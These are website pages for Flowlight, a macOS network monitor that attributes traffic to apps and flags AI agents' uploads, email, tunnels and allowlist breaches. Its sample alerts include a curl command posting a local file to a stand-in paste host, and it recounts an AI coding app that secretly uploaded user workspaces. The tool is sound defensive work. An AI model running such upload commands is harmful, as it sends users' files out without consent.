# About Flowlight
URL: https://flowlight.xinbetween.com/about/

About

 Why Flowlight exists

 Software on your Mac now decides for itself what to do next. Flowlight is how you see what it did.

 On this page
 The storyPrinciplesWho makes itThanks

 The story

 For years, the question "what is my Mac talking to?" had a simple audience: people curious about an app that phoned home. Then
 AI agents arrived. They read your files, run shell commands and call tools, often while you're doing something else, and any of
 those tools can open a network connection.

 In September 2026 a developer went looking for why a folder was eating 700 MB of disk and found that ZCode, an AI coding app,
 had been packaging entire workspaces, Git history included, and uploading them to cloud storage in the background. The company
 apologized, disabled the feature and open-sourced the app. But the discovery came from a disk-usage mystery, not from any tool
 built to notice.

 The uploads were encrypted. The part that mattered wasn't: which app, which host, how many megabytes, and when. macOS
 already knows those facts for every connection. Flowlight exists to put them on screen, keep the history, and tell you when an app,
 especially an agent, does something that doesn't look like its usual self.

 Principles

 Observe, don't block. Flowlight never breaks your network. It shows and explains; firewalls decide.

 Metadata, not payloads. Hostnames, ports and byte counts are enough to catch what matters. Contents stay encrypted and unread.

 Local first. Your history is a file on your Mac. No account, no cloud, no telemetry.

 Explainable alerts. Every alert names the app, the destination and the number that tripped it. No black-box scores.

 Open source. A tool that watches your traffic should be one you can read. Flowlight is GPL-3.0.

 Who makes it

 Flowlight is an independent open-source project by xinbetween and
 its contributors. It isn't affiliated with Apple or with any AI provider
 named on this site. Ideas, bug reports and pull requests are welcome, especially new agents and providers to recognize.

 Thanks

 ferstar, for the ZCode teardown that made the case for this app.

 The Wireshark project, whose ChmodBPF approach Flowlight's packet-capture setup follows.

 Team Cymru, for the free IP-to-ASN service behind network-owner labels.

---

# Flowlight documentation
URL: https://flowlight.xinbetween.com/docs/

Documentation

 Using Flowlight

 Everything from the first launch to tuning the agent rules. Flowlight 0.1.4, macOS 15 or later.

 On this page
 InstallFirst launchHostnames
 The viewsAI agent rulesTools & MCPAllowlistsHTTPS inspectionOther alerts
 Capture enginesYour dataUpdates
 Demo modeUninstallLimitations

 Install

 Download Flowlight.dmg, open it and drag Flowlight into Applications.

 Prefer an installer? Every release also has a .pkg.

 Building from source needs Xcode 16 or later and xcodegen:

brew install xcodegen
git clone https://github.com/xinbetween/flowlight.git && cd flowlight
xcodegen generate && scripts/build-local.sh
open build/Build/Products/Release/Flowlight.app

 First launch

 This preview isn't notarized yet, so macOS says it can't verify the developer. Right-click Flowlight in Applications,
 choose Open, then Open again. You only do this once. On macOS 15 and later you can also allow it in
 System Settings › Privacy & Security › Open Anyway.

 Traffic starts appearing within a second. The ↓↑ figures in your menu bar are live download and upload rates.

 Hostnames: the one-time setup

 By default macOS only tells Flowlight the IP address each app talks to. To show real hostnames, Flowlight reads two
 things from network packets: DNS answers, and the server name a client asks for when it opens an HTTPS connection (TLS SNI).
 A filter in the kernel drops every other packet before Flowlight sees it, and packet contents are never stored.

 macOS only lets administrators read packets, so the Name Your Traffic window asks for your password once. It installs
 /Library/LaunchDaemons/com.flowlight.bpf-access.plist, which gives the access_bpf group read access to
 /dev/bpf* at each boot, the same approach Wireshark uses. Remove it any time from Capture › Remove Packet Capture Access.

 Identify network owners labels traffic with no hostname by who operates the address
 (Cloudflare, Inc. · AS13335). It's on by default and sends those public IP addresses (never private ones) to Team Cymru's
 DNS service. Turn it off in Capture.

 The views

 ViewShortcutWhat it answers

 Live⌘1What's moving right now: per-app rates over the last few seconds and the busiest destination.

 AI Agents⌘2Which agents are active, which AI providers they use, and what else they contacted.

 Reports⌘3Where traffic went, from second to year. Group by App, Destination or IP; switch to Charts; export CSV.

 Alerts⌘4Everything that looked unusual, with the app, the destination and the number that tripped the rule.

 Inspect⌘5Optional: decrypted requests from the agents you route through Flowlight, and the tool calls behind them.

 In Reports, hover a bar to see which apps drove it, click it to zoom in, and double-click any row to narrow the report to it.

 AI agent rules

 An app counts as an agent if Flowlight knows it by name (16 today, including Claude Code, Codex, Cursor, GitHub Copilot,
 Gemini CLI, Ollama and ZCode) or if it calls one of 25 LLM API providers. Browsers are excluded.

 RuleFires when an agent…Default

 Sensitive channeluses email, file transfer, SSH or remote desktop, a tunnel or proxy, peer-to-peer, or a database connectionOn. Critical for email, file transfer, tunnels and P2P

 Possible exfiltrationuploads to hosts that aren't AI providers, over an hour100 MB/h

 Unnamed hostconnects to a raw IP with no hostname on an unusual portOn

 Active while you're awaymoves 1 MB or more in a minute after you stop using the keyboard and mouse15 minutes

 Agents get a 1-hour learning period before new-destination alerts start. Change any of this in Settings › Detection.

 Tools & MCP servers

 Agents do much of their work through other processes: a shell tool runs curl, git or npm, and MCP
 servers run as their own processes. Flowlight follows each process's parents back to the agent that started it, so that traffic is
 counted as the agent's. In AI Agents, the agent's detail lists these under Tools & MCP servers, and
 destinations read via curl or via github MCP. In Reports, the process row reads via Claude Code.

 MCP servers are named by matching their command line to the MCP configuration of Claude Code (~/.claude.json), Claude Desktop,
 Cursor (~/.cursor/mcp.json), Windsurf, VS Code, Codex (~/.codex/config.toml), Zed and Gemini CLI. Remote MCP servers
 are matched by the hostname in their URL, and unconfigured servers by recognizable package names such as
 @modelcontextprotocol/server-github.

 Attribution is per process: Flowlight can't tell which individual tool call inside a long-running MCP server opened a connection.

 Allowlists

 Select an agent in AI Agents and use Allowlist in its detail to say where it may connect. Enter domains
 (subdomains included), IP addresses or CIDR ranges, or pick a preset: GitHub, npm, PyPI, Homebrew, Docker Hub, Rust crates, Go modules or
 Apple. The agent's AI providers (unless you turn that off) and your local network are always allowed.

 From then on, anything the agent or its tools contact that isn't listed raises a critical Allowlist violation alert (once
 per domain every 6 hours) and is marked Not allowed, with an Allow button that adds it. Flowlight doesn't block
 connections; blocking needs the Network Extension engine and is on the roadmap.

 HTTPS inspection (optional)

 Off by default. When you turn it on in Inspect, Flowlight runs a local proxy on 127.0.0.1:8877 with its own
 certificate authority, created on your Mac. For apps you route through it, it decrypts HTTPS and shows each request and response:
 headers, bodies, status and timing. From an AI agent's model responses it reads every tool call the model asked for
 (Anthropic, OpenAI Chat and Responses, Gemini, and MCP tools/call requests) and the result the agent sent back, and it
 links each request a tool makes back to the call that caused it: curl's request to paste.example shows
 ← Bash: curl -s https://paste.example/up. In AI Agents, an agent's detail gets Tool calls
 (each call with its command, result or error, and the requests it made) and MCP servers (name and version, local or
 remote, the tools it offers, calls and failures). Bodies open as a collapsible JSON tree in their original key order; event streams
 show one event at a time.

 Turn it on in Inspect › Setup. By default only AI agents and the tools they start are decrypted; other apps sent through
 the proxy pass through encrypted and aren't recorded.

 Route an agent. Click Open Inspected Terminal and start Claude Code, Codex, Gemini CLI or Aider there, or
 paste Copy Shell Setup into any shell. It sets the proxy variables and points Node, Python, curl and Git at the Flowlight
 certificate, for that shell only.

 Optional: trust the certificate (macOS asks for your password) and turn on the system proxy, so desktop apps that
 follow proxy settings (Cursor, VS Code, Claude) are inspected too. The proxy file falls back to a direct connection whenever Flowlight
 isn't running.

 Apple services and password managers are never decrypted (edit the list in Setup). Apps that pin their certificates refuse the
 Flowlight certificate; Flowlight notices and passes them through encrypted. API keys, cookies and other credential headers are never
 stored, recorded requests are kept 3 days, and Remove Certificate & Recorded Data deletes the certificate, its trust
 setting and everything recorded. Inspection is HTTP/1.1 only (Flowlight asks both sides for it) and not available in demo mode.

 Other alerts

 Traffic spike: an hour at least 3σ above the app's rolling baseline (after 24 hours of history, above 1 MB).

 Unusual number of destinations in a day, against the app's baseline.

 Upload above 99th percentile of the app's hourly uploads over 30 days.

 First contact with a new domain, and non-standard ports, after a 24-hour learning period per app.

 Traffic without UI activity: a windowed app you haven't used for 10 minutes uploads more than 5 MB a minute.

 Capture engines

 The default engine samples macOS's nettop once a second, which needs no special permission. Connections shorter than
 about a second can be missed. A Network Extension engine (a content filter that sees every flow) is included in the source for
 builds signed with Apple's content-filter entitlement; see the developer guide.

 Your data

 Everything lives in ~/Library/Application Support/Flowlight/traffic.sqlite. Per-second rows are kept 6 hours
 (adjustable), minute rows 14 days, hourly rows 400 days, daily rows indefinitely, and alerts 90 days.
 Capture › Clear all data deletes it.

 Updates

 Flowlight checks GitHub for a new release on launch and once a day, and Check for Updates… is in the app
 and menu bar menus. Download fetches the disk image to Downloads and checks it against the release's published SHA-256. Nothing is installed
 until you choose: Quit & Install closes Flowlight, replaces it with the new version and reopens it, keeping your history and
 settings. Install Later keeps you working. If Flowlight was installed with the .pkg, macOS asks for an administrator
 password to replace it. Turn the check off in Settings › General.

 Updating by hand? Quit Flowlight first (menu bar icon › Quit), then drag the new version into Applications. Finder can't replace an
 app that's still running and says the item is in use.

 Demo mode

 open /Applications/Flowlight.app --args -FLDemo YES starts Flowlight with 90 days of synthetic traffic in a separate
 database, so you can look around without recording your own. It's what the screenshots on this site show.

 Uninstall

 In Capture, choose Remove Packet Capture Access (asks for your password) if you enabled it.

 Quit Flowlight and move it from Applications to the Trash.

 Delete ~/Library/Application Support/Flowlight to remove the recorded history.

 Limitations

 TCP and UDP only. ICMP (ping) and other raw-IP protocols aren't attributed.

 Attribution is per process, not per thread.

 Unless you turn on HTTPS inspection, Flowlight reads metadata only and never decrypts traffic. QUIC server names come from DNS rather
 than the encrypted handshake.

 Inspection only sees apps that use the proxy, and never apps that pin their certificates.

 Hostname capture follows the primary network interface.

---

# Flowlight for macOS
URL: https://flowlight.xinbetween.com/

Free · open source · macOS 15+

 Every app. Every domain. Every agent.

 Flowlight shows which app on your Mac talked to which domain, over which protocol, and how much it sent.
 It keeps a closer eye on AI agents, so an email, an SSH session or a 180 MB upload you never asked for
 doesn't go unnoticed.

 The AI Agents view: each agent's model provider, and everything else it talked to. Shown with demo data.

 When to reach for Flowlight

 Questions it answers in seconds

 AI AgentsAn agent is running while you're in a meeting

 See every host it and its tools touched besides its model provider, and get an alert if it leaves its allowlist, sends email or uploads 100 MB somewhere new.

 ReportsYour upload spiked and you don't know why

 Hover the spike to see the app behind it, click to zoom from the hour to the minute, and follow it to the exact domain and IP.

 AlertsA new app started phoning home

 First contact with a new domain, a non-standard port or a traffic spike each raise an alert that names the app and the number that tripped it.

 LiveSomething is saturating your connection right now

 Top talkers updated every second, with the busiest destination for each app, and live rates in your menu bar.

 ReportsYour hotspot data vanished this month

 Switch to the month view and group by app. The biggest consumer is the top row, with CSV export if you need receipts.

 Reports · DestinationYou need to audit where data goes

 Group by destination to see every app that talks to a domain, or by IP to see what sits behind an address.

 Capture

 The two questions Activity Monitor can't answer

 Which app sent it? Where did it go? Flowlight ties every TCP and UDP flow to its app and its real
 hostname, with bytes in and out, stored locally so you can look back an hour or a year.

 Every app
 Apps, command-line tools and background daemons, attributed by process. Your agents' helper scripts included.

 Real hostnames
 Taken from TLS server names and DNS answers seen on the wire, so you see api.openai.com, not
 104.18.7.192. Traffic with no name can show who owns the address.

 1 s → 1 year
 Zoom from second to year. Group by app, by destination or by IP. Hover a spike to see the app behind it.

 AI Agent Watch

 Your agents have network access. Now you have oversight.

 Flowlight knows 16 agents by name. It also spots any other process that calls one of 25 LLM API
 providers, so a Python script talking to api.openai.com is an agent too. Browsers don't count:
 a person chatting isn't an agent.

 Claude CodeCodexCursor
 WindsurfGitHub CopilotGemini CLI
 AiderGooseOpenCode

 ClaudeZedPerplexityZCode
 + anything that calls an LLM API

 ⚠ Critical
 Allowlist violation

 "Claude Code may talk to GitHub and npm, nothing else." Add domains, IPs or ranges, or start from a preset. Anything else raises an alert, with one-click Allow.

 Claude Code › curl contacted paste.example:443, which isn't on Claude Code's allowlist

 ↳ Attribution
 Tools & MCP servers

 The curl, git or npm an agent's shell tool runs, and the MCP servers it starts, count as the agent's traffic, named from its own MCP config.

 api.github.com · via github MCP  ·  paste.example · via curl

 ⌕ Opt-in
 Tool calls, from the model's own responses

 Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run, then ties each tool's request back to the call that caused it.

 curl → paste.example:443  ←  Bash: curl -s https://paste.example/up -d @notes.txt

 ⚠ Critical
 Sensitive channel

 The agent sends email, transfers files, opens SSH or remote desktop, goes through a tunnel or proxy, or talks to a database.

 Claude Code used SMTP-SUBMISSION to smtp.relay.example:587, 2.4 MB sent

 ⚠ Critical
 Possible exfiltration

 More than 100 MB an hour goes to hosts that aren't AI providers.

 Codex uploaded 180 MB to non-AI hosts in the last hour: uploads.paste.example

 ▲ Warning
 Unnamed host

 A connection to a bare IP address with no hostname, on an unusual port.

 python3 connected to 203.0.113.45:4444 (tcp) with no hostname

 ▲ Warning
 Active while you're away

 Data keeps moving after 15 minutes without keyboard or mouse input.

 Codex moved 48 MB in the last minute while you were away (no input for 37 min)

 ⓘ Info
 New destination, sooner

 Agents get a 1-hour learning period before new-domain alerts start (24 hours for other apps). Every threshold is adjustable.

 Flowlight observes every TCP and UDP flow, which covers essentially all app traffic. ICMP (ping) and
 other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted unless you turn on HTTPS inspection.

 Why Flowlight exists

 Your tools now make their own decisions. You should be able to see where your data goes when they do.

 Coding agents read your files, run commands and call tools, and any of those tools can open a socket. In September 2026,
 an AI coding app was found packaging users' whole workspaces, Git history included, and uploading them in the background.
 The researcher who caught it only noticed because a cache folder was eating disk space.

 The uploads were encrypted, but the facts that mattered weren't: which app, which host, how many megabytes, and when.
 macOS already knows all of that. Flowlight puts it on screen, keeps the history, and flags what doesn't look right.

 Read the full story →

 Privacy

 A monitor you don't have to monitor

 Stays on your MacOne local SQLite file. No account, no cloud sync, no telemetry.

 Metadata by defaultHostnames, ports and byte counts. Decrypting HTTPS is a separate mode you have to turn on, and it stays on your Mac.

 Filtered in the kernelCapture passes only DNS answers and TLS ClientHellos. Everything else is dropped before Flowlight sees it.

 Lookups you controlNaming who owns an address sends only public IPs with no hostname to Team Cymru, and turns off in one click. The daily update check only asks GitHub for the latest version, and can be turned off too.

 One agent, all its tools. Traffic from the git, curl and MCP servers Claude Code started is counted as Claude Code's,
 labelled via curl or via github MCP. With an allowlist of GitHub and npm, the SMTP relay and the paste site stand out as Not allowed.

 Reports. Second-to-year zoom, three groupings, charts that stay readable with hundreds of apps.

 Alerts. Each one names the app, the destination and the number that tripped it.

 Install

 Running in under a minute

 Download Flowlight.dmgOpen it and drag Flowlight into Applications. A .pkg installer is also on every release. The first launch of this preview needs right-click › Open.

 Launch itTraffic appears within a second, and live ↓↑ rates sit in your menu bar.

 Name your trafficApprove the one-time setup (your password, once) so Flowlight can read hostnames.

 Prefer to build it yourself, or look around with sample data first?

 FAQ
Questions

 Does Flowlight block traffic?

 No. It observes and alerts, including when an agent leaves its allowlist. Blocking allowlist violations is on the roadmap for the Network Extension build.

 Can it read my HTTPS traffic?

 Not by default. It reads the hostname a client asks for when it opens a connection (TLS SNI) and the DNS answers
 that map names to addresses, and contents stay encrypted. If you want the full picture, HTTPS inspection is a
 separate, opt-in mode: Flowlight becomes a local proxy with its own certificate authority and decrypts the apps you route
 through it (AI agents only, by default), including every tool call a model asks an agent to run. Apps that pin their
 certificates still refuse it, and Apple services and password managers are never decrypted.

 How is this different from Little Snitch or LuLu?

 Those are firewalls that ask you to allow connections. Flowlight is an analytics tool: history at any zoom,
 anomaly baselines, and rules built for AI agents. They work well side by side.

 Why does it ask for my password?

 macOS only lets administrators read network packets. The one-time setup gives your account read access, the
 same way Wireshark does. You can remove it any time from the Capture screen.

 Can it tell which MCP server or tool made a request?

 Yes, at the process level. Flowlight follows each process back to the agent that started it, so a shell tool's
 curl or an MCP server's connections are attributed to that agent, and MCP servers are named from Claude Code, Claude
 Desktop, Cursor, Windsurf, VS Code, Codex, Zed and Gemini CLI configs. It can't see which individual tool call inside a
 long-running server opened a connection.

 Does an allowlist block traffic?

 Not yet. A violation raises a critical alert and marks the destination "Not allowed". Blocking needs the Network
 Extension engine and is on the roadmap.

 Which agents does it recognize?

 Claude Code, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, Aider, Goose, OpenCode, Ollama, LM Studio,
 ChatGPT, Claude, Zed, Perplexity and ZCode, plus any non-browser process that calls a known LLM API. Adding one is a
 one-line pull request.

 How does it update?

 Once a day Flowlight asks GitHub for the latest release. When there's one, it shows the notes and can download the
 disk image, verify it against the published SHA-256 and open it. You can turn the check off in Settings.

 Is it really free?

 Yes. It's free software under the GPL-3.0: no paid tier, no data collection.

 Know what leaves your Mac.

 Free software for macOS 15 and later.

# Flowlight privacy
URL: https://flowlight.xinbetween.com/privacy/

Privacy

 Your traffic stays on your Mac

 Flowlight has no account, no server and no analytics. This page lists everything it records and every request it makes,
 so you can check the claims against the source.

 On this page
 In shortWhat it recordsPacket captureRead locallyHTTPS inspection
 Network requestsPermissionsRetention
 This websiteContact

 In short

 Flowlight records network metadata (which app, which host, which port, how many bytes, when) in a database on your Mac.

 It never records packet contents and never decrypts traffic, unless you turn on the optional HTTPS inspection for apps you route through it.

 Nothing you record is ever sent anywhere. There is no telemetry, crash reporting or analytics.

 The app makes a few network requests of its own, listed below, and you can turn off each optional one.

 What it records

 For each second: the app (bundle ID, name, executable path, process ID), the remote IP address, hostname, port, transport and
 protocol, and bytes sent and received. It also stores the alerts it raises and per-app baselines used by the anomaly rules.
 All of it lives in ~/Library/Application Support/Flowlight.

 Packet capture

 If you approve the one-time hostname setup, Flowlight reads packets on your primary network interface through a kernel filter that
 passes only two things: DNS responses, and the first message of a TLS connection (the ClientHello). From those it keeps only
 hostnames and the addresses they map to, in memory. Everything else is dropped in the kernel, and no packet is written to disk.

 What it reads on your Mac

 To attribute an agent's tools and MCP servers, Flowlight reads each process's parent and command line from macOS, and the MCP
 configuration files of the agents it supports (for example ~/.claude.json, ~/.cursor/mcp.json and
 ~/.codex/config.toml). It keeps only each server's name, launch command and URL, in memory, and stores only the resulting
 labels ("via curl", "github MCP") with your traffic. Nothing from these files or command lines is sent anywhere.

 HTTPS inspection

 Off by default. If you turn it on, Flowlight creates a certificate authority on your Mac (its key never leaves
 ~/Library/Application Support/Flowlight/Inspection) and runs a proxy that accepts connections only from this Mac. For apps you
 route through it, it records requests and responses, including bodies up to 2 MB, in the local database for 3 days. Credential headers
 (Authorization, cookies, API keys) are replaced with their length before anything is stored. Apple services and password managers are
 never decrypted. Nothing recorded is sent anywhere. Turning inspection off stops the proxy; Remove Certificate & Recorded
 Data deletes the certificate, its trust setting and every recorded request.

 Network requests the app makes

 RequestSent toWhat it containsWhen

 Update checkapi.github.comA standard HTTPS request for the latest release; GitHub sees your IP address and the Flowlight/<version> user agentOn launch and daily, from 0.1.2. Off switch in Settings › General

 Update downloadgithub.comThe disk image and its checksum fileOnly when you click Download & Open

 Reverse DNSYour configured DNS resolverA lookup of an IP address's registered name, when no hostname was seenAs needed, in the default capture mode

 Network owner lookupTeam Cymru, over DNSPublic IP addresses with no known hostname. Private and reserved addresses never leave your MacOn by default. Off switch in Capture › Identify network owners

 Permissions

 Administrator password, once, for packet-capture access. Removable from the Capture screen.

 Notifications, for warnings. Optional.

 Login item, only if you turn on Launch at login.

 Retention

 Per-second data 6 hours (adjustable), minute data 14 days, hourly data 400 days, daily totals indefinitely, alerts 90 days.
 Capture › Clear all data deletes everything, and removing ~/Library/Application Support/Flowlight does the same.

 This website

 This site is a static page hosted on GitHub Pages and served through Cloudflare. It sets no cookies and runs no analytics. GitHub
 and Cloudflare process requests to serve it, and the fonts load from Google Fonts, which receives your IP address when you visit.

 Contact

 Questions or a privacy concern? Open an issue. For anything sensitive, use GitHub's
 private vulnerability reporting on the repository.

Releases

 What's new

 Downloads, checksums and full notes for each version are on GitHub Releases.

 Next release
In development

 Tool results and MCP servers. With HTTPS inspection on, each tool call shows what came back (output or error),
 and each agent's detail gets Tool calls and MCP servers tabs: server name and version, the tools it offers, calls
 and failures.

 JSON tree viewer for request and response bodies, in their original key order, with a Raw view and Copy.

 Fixed: with the system proxy on, Flowlight's own connections looped back through its proxy, recording each
 request many times and slowing traffic.

 Fixed: nettop sometimes hangs; Flowlight now restarts a stuck sample after 5 seconds instead of stopping capture.

 the apps you route through it: AI agents and their tools by default. See every request and response in the new Inspect view.

 through untouched.

 Flowlight, without trusting anything system-wide.

September 22, 2026

 Quit & Install. Updates download and verify first, then ask before Flowlight quits: Quit & Install
 replaces the app and reopens it, Install Later keeps you working. You no longer have to quit and drag the new version in yourself.

 Network owners on by default. Traffic with no hostname is labelled with who operates the address. Only public IPs are
 looked up, and Capture › Identify network owners turns it off.

 AI Agents layout. The agent table fits its rows, so the detail pane has room for tools, MCP servers and the allowlist.

 0.1.2
September 21, 2026

 Per-agent allowlists. "Claude Code may talk to GitHub and npm, nothing else": domains, IPs, CIDR ranges and presets,
 with a critical alert and one-click Allow for anything else.

 Tools & MCP server attribution. Processes an agent starts (shell tools, MCP servers) count as the agent's traffic,
 with MCP servers named from Claude Code, Cursor, Codex, VS Code and other configs.

 Update checks. Flowlight looks for new releases daily and offers a download verified against its published SHA-256.

 About window with copyright, license and links.

 Relicensed from MIT to the GNU General Public License v3.0.

 0.1.1
September 21, 2026

 ZCode is recognized as an AI agent. After the September 2026 incident, where ZCode uploaded workspace snapshots
 (mostly .git history) to Alibaba Cloud storage in the background, a transfer like that raises a critical
 Possible exfiltration alert, with or without a hostname.

 More LLM providers: Zhipu AI / Z.ai, Moonshot (Kimi), Alibaba Qwen (DashScope API hosts only) and MiniMax.
 16 known agents and 25 providers in all.

 0.1.0
September 21, 2026First preview

 Every TCP and UDP flow attributed to its app, with hostnames from TLS SNI and DNS.

 AI Agents view with sensitive-channel, exfiltration, unnamed-host and while-away rules.

 108 protocols in 13 families, reports from second to year, three breakdown groupings, charts and CSV export.

 Anomaly alerts, a menu bar readout, a disk image and an installer package.
